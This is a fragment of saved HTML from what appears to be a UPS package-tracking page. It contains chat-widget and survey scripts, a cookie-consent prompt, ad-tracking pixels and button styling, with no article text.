<script src="https://media-us1.digital.nuance.com/media/launch/chatLoader.min.js?codeVersion=1625723482466" type="text/javascript" charset="utf-8"></script><ul id="ui-id-1" tabindex="0" class="ui-menu ui-widget ui-widget-content ui-autocomplete ui-front" style="display: none;"></ul><div role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div><ul id="ui-id-2" tabindex="0" class="ui-menu ui-widget ui-widget-content ui-autocomplete ui-front" style="display: none;"></ul><div role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></div><div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front modal ui-draggable ui-resizable" aria-describedby="one" aria-labelledby="ui-id-3" style="display: none; position: absolute;"><div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle"><span id="ui-id-3" class="ui-dialog-title">&nbsp;</span><button type="button" class="ui-dialog-titlebar-close"></button></div><div id="one" class="ui-dialog-content ui-widget-content" style="display: block;"></div><div class="ui-resizable-handle ui-resizable-n" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-e" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-s" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-w" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-se ui-icon ui-icon-gripsmall-diagonal-se" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-sw" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-ne" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-nw" style="z-index: 90;"></div></div><div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front modal ui-draggable ui-resizable" aria-describedby="two" aria-labelledby="ui-id-4" style="display: none; position: absolute;"><div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle"><span id="ui-id-4" class="ui-dialog-title">&nbsp;</span><button type="button" class="ui-dialog-titlebar-close"></button></div><div id="two" class="ui-dialog-content ui-widget-content" style="display: block;"></div><div class="ui-resizable-handle ui-resizable-n" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-e" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-s" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-w" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-se ui-icon ui-icon-gripsmall-diagonal-se" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-sw" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-ne" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-nw" style="z-index: 90;"></div></div><div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front modal ui-draggable ui-resizable" aria-describedby="thre" aria-labelledby="ui-id-5" style="display: none; position: absolute;"><div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle"><span id="ui-id-5" class="ui-dialog-title">&nbsp;</span><button type="button" class="ui-dialog-titlebar-close"></button></div><div id="thre" class="ui-dialog-content ui-widget-content" style="display: block;"></div><div class="ui-resizable-handle ui-resizable-n" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-e" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-s" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-w" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-se ui-icon ui-icon-gripsmall-diagonal-se" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-sw" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-ne" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-nw" style="z-index: 90;"></div></div><div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front modal ui-draggable ui-resizable" aria-describedby="for" aria-labelledby="ui-id-6" style="display: none; position: absolute;"><div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle"><span id="ui-id-6" class="ui-dialog-title">&nbsp;</span><button type="button" class="ui-dialog-titlebar-close"></button></div><div id="for" class="ui-dialog-content ui-widget-content" style="display: block;"></div><div class="ui-resizable-handle ui-resizable-n" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-e" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-s" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-w" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-se ui-icon ui-icon-gripsmall-diagonal-se" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-sw" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-ne" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-nw" style="z-index: 90;"></div></div><div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front modal ui-draggable ui-resizable" aria-describedby="fiv" aria-labelledby="ui-id-7" style="display: none; position: absolute;"><div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle"><span id="ui-id-7" class="ui-dialog-title">&nbsp;</span><button type="button" class="ui-dialog-titlebar-close"></button></div><div id="fiv" class="ui-dialog-content ui-widget-content" style="display: block;"></div><div class="ui-resizable-handle ui-resizable-n" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-e" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-s" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-w" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-se ui-icon ui-icon-gripsmall-diagonal-se" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-sw" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-ne" style="z-index: 90;"></div><div class="ui-resizable-handle ui-resizable-nw" style="z-index: 90;"></div></div><div id="__tealiumImplicitmodal" style="display: none;"><div class="implicit_privacy_prompt implicit_consent" role="alert"><button class="close_btn_thick"> <span class="icon ups-icon-x" aria-hidden="true"></span> <span class="ups-readerTxt">Close</span> </button> <div class="implicit_privacy_prompt_content"> <h2 class="implicit_consent_title">This website uses cookies</h2> <div class="implicit_consent__inner"> <div class="implicit_consent__inner-left"> <p>We do this to better understand how visitors use our site and to offer you a more personal experience. Please see our <a href="https://www.ups.com/us/en/help-center/legal-terms-conditions/privacy-notice.page" rel="noopener noreferrer" target="_blank">Privacy Notice</a> for more information. You can manage your preferences by selecting <a class="showConsentpreferences_button" href="javascript:utag.gdpr.showConsentPreferences();window.scrollTo(0,0);">Cookie Settings</a>.</p> </div> </div> </div> </div></div><iframe id="inqChatStage" title="Chat Window" name="10005649" src="https://www.ups.com/nuance/nuance-chat.html?IFRAME&amp;nuance-frame-ac=0" style="z-index:9999999; display: none;overflow: hidden; position: absolute; height: 1px; width: 1px; left: 0px; top: 0px; border-style: none; border-width: 0px;" scrolling="NO" frameborder="0" __idm_frm__="123"></iframe><div id="inqDivResizeCorner" style="border-width: 0px; position: absolute; z-index: 9999999; left: 424px; top: 284px; cursor: se-resize; height: 16px; width: 16px; display: none;"></div><div id="inqResizeBox" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; display:none; height: 0px; width: 0px;"></div><div id="inqTitleBar" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; cursor: move; height: 55px; width: 410px; display: none;"></div><div id="ttdUniversalPixelTag" style="display: none;"></div><img style="display:none" alt="" aria-hidden="true" width="0" height="0" id="db_bw_pixel_ad" src="https://match.prod.bidr.io/cookie-sync/demandbase"><img style="display:none" alt="" aria-hidden="true" width="0" height="0" id="db_lr_pixel_ad" src="https://id.rlcdn.com/464526.gif"><div id="ZN_1GqrxzvRld7vjWm"></div><iframe id="universal_pixel_3xdvk81" height="0" width="0" style="display:none;" src="https://insight.adsrvr.org/track/up?adv=bhipc3r&amp;ref=https%3A%2F%2Fwww.ups.com%2Ftrack%3Floc%3Den_US%26requester%3DST%2F&amp;upid=3xdvk81&amp;upv=1.1.0" title="TTD Universal Pixel"></iframe><div id="nuance-chat-anchored" style="position: fixed; right:50px; bottom: 0px;z-index:9999" aria-live="polite"><div><style>
.UPS-dsktp-VA-aval_v2 {
 font-family: "BerlingskeSans",Tahoma,helvetica,arial,sans-serif;
 font-weight: bold;
  font-size: 14px;
  background-color: rgba(0, 131, 105,.9);
  box-shadow: 0px 0px 6px rgba(0,0,0,0.2); 
  border: 0;
  color: #ffffff;
  text-decoration: none; 
  transition: background ease .2s;
  cursor: pointer;
  display: block;
  width: 152px;
  height: 35px; 
}
 
.UPS-dsktp-VA-aval_v2:hover { 
    background-color: rgba(0, 106, 85,1);
}
 
.UPS-dsktp-VA-aval_v2:focus { 
    background-color: rgba(0, 106, 85,1);
 outline: 1px auto #ffb500 !important;
}

.UPS-dsktp-VA-aval_v2 svg { 
 fill: #fff; 
} 

.UPS-dsktp-VA-aval_v2-svg {
  display: inline-block;
  position: relative;
  top: 2px; 
  left: -8px; 
} 

.UPS-dsktp-VA-aval_v2-svg-2 {
 position: relative;
 left: 10px;
 top: -2px;
} 

.UPS-dsktp-VA-aval_v2-text { 
 position: relative;
 left: -3px;
 top: -2px;
}
</style>

<button class="UPS-dsktp-VA-aval_v2" href="#" aria-label="Click to chat" role="button">
 
 
 <svg width="20" height="20" viewBox="0 0 20 20" class="UPS-dsktp-VA-aval_v2-svg" alt="" role="img" aria-hidden="true"><path d="M10,0A10,10,0,1,0,20,10,10,10,0,0,0,10,0Zm1.5,16.92h-3V14.05h3Zm2.6-7.66a7.35,7.35,0,0,1-1.4,1.32L12,11.1a2,2,0,0,0-.74,1,4.1,4.1,0,0,0-.13,1.12H8.54A7.83,7.83,0,0,1,8.84,11a4.06,4.06,0,0,1,1.29-1.42l.7-.54a2.29,2.29,0,0,0,.56-.56,1.91,1.91,0,0,0,.39-1.16A2.26,2.26,0,0,0,11.35,6a1.81,1.81,0,0,0-1.56-.6,1.74,1.74,0,0,0-1.59.74,3.08,3.08,0,0,0-.42,1A17.33,17.33,0,0,1,5.27,5.85a3.81,3.81,0,0,1,1.6-2,5.05,5.05,0,0,1,2.8-.73,6.05,6.05,0,0,1,3.62,1,3.53,3.53,0,0,1,1.44,3.06A3.41,3.41,0,0,1,14.1,9.26Z"></path></svg> 

 <span class="UPS-dsktp-VA-aval_v2-text">Ask UPS</span>
 
 <svg width="18" height="12" viewBox="0 0 17.9 11.6" class="UPS-dsktp-VA-aval_v2-svg-2" alt="" role="img" aria-hidden="true"><path d="M17.76,8.63,11.57,2.44a.49.49,0,0,0-.11-.18L9.34.14A.52.52,0,0,0,9,0a.49.49,0,0,0-.38.14L6.44,2.26a.67.67,0,0,0-.11.18L.15,8.63a.48.48,0,0,0,0,.7l2.12,2.12a.48.48,0,0,0,.7,0l6-6,6,6a.5.5,0,0,0,.71,0l2.12-2.12A.5.5,0,0,0,17.76,8.63Z"></path></svg>

</button></div></div><script src="https://siteintercept.qualtrics.com/dxjsmodule/CoreModule.js?Q_CLIENTVERSION=1.55.0&amp;Q_CLIENTTYPE=web" defer=""></script><script src="https://siteintercept.qualtrics.com/dxjsmodule/FeedbackButtonModule.js?Q_CLIENTVERSION=1.55.0&amp;Q_CLIENTTYPE=web" defer=""></script><style type="text/css">.QSIFeedbackButton div,.QSIFeedbackButton dl,.QSIFeedbackButton dt,.QSIFeedbackButton dd,.QSIFeedbackButton ul,.QSIFeedbackButton ol,.QSIFeedbackButton li,.QSIFeedbackButton h1,.QSIFeedbackButton h2,.QSIFeedbackButton h3,.QSIFeedbackButton h4,.QSIFeedbackButton h5,.QSIFeedbackButton h6,.QSIFeedbackButton span,.QSIFeedbackButton pre,.QSIFeedbackButton form,.QSIFeedbackButton fieldset,.QSIFeedbackButton textarea,.QSIFeedbackButton p,.QSIFeedbackButton blockquote,.QSIFeedbackButton tr,.QSIFeedbackButton th,.QSIFeedbackButton td{ margin: 0; padding: 0;background-color: transparent; border: 0; font-size: 12px; line-height: normal; vertical-align:baseline; box-shadow: none; }.QSIFeedbackButton img{ height: auto; width: auto; margin: 0; padding: 0 }.QSIFeedbackButton ul,.QSIFeedbackButton ol{ margin: 12px 0; padding-left: 40px; }.QSIFeedbackButton ul li{ list-style-type: disc; }.QSIFeedbackButton ol li{ list-style-type: decimal; }.QSIFeedbackButton .scrollable{ -webkit-overflow-scrolling: touch; }.QSIFeedbackButton table{ border-collapse: collapse; border-spacing: 0; }.QSIFeedbackButton table td{ padding: 2px; }.QSIFeedbackButton *{ box-sizing: content-box; }</style><div class="QSIFeedbackButton" style="position: fixed; visibility: hidden; inset: 0px; display: flex; flex-direction: column; justify-content: flex-end; align-items: flex-start; margin: 0px; padding: 0px; z-index: 2000000000;"></div><div id="QSIFeedbackButton-target-container" class="QSIFeedbackButton" role="dialog" aria-hidden="true" aria-labelledby="QSIFeedbackButton-btn" style="position: fixed; overflow: hidden; color: rgb(0, 0, 0); background-color: rgb(237, 237, 237); border-top: 2px solid rgb(166, 166, 166); border-right: none; border-bottom: 2px solid rgb(166, 166, 166); border-left: 2px solid rgb(166, 166, 166); border-image: initial; box-sizing: border-box; transition: all 0.5s ease 0s; margin: 0px; padding: 0px; z-index: 2000000001; height: 50%; border-radius: 2px 0px 0px 2px; max-width: 400px; width: 100vw; left: 100%; bottom: 196px;"><div id="QSIFeedbackButton-close-btn-container" style="background-color: transparent; padding-bottom: 10px; right: 10px; top: 10px; position: absolute; display: flex; justify-content: flex-end;"><button role="button" id="QSIFeedbackButton-close-btn" tabindex="-1" style="cursor: pointer; border: 0px; padding: 0px; background-color: transparent; z-index: 2000000001; margin: 0px;"><img src="https://siteintercept.qualtrics.com/WRSiteInterceptEngine/../WRQualtricsShared/Graphics/siteintercept/wr-dialog-close-btn-black.png" alt="Close" style="height: 17px; width: 17px;"></button><div id="QSIFeedbackButton-close-btn-background" style="position: absolute; width: 28px; height: 28px; border-radius: 14px; top: -5px; right: -5px; background-color: rgb(255, 255, 255); opacity: 0.5;"></div></div></div><div style="display: none;"></div></body><iframe id="y0UXVju2e3h97ofA" style="display: none;" __idm_frm__="131"></iframe></html>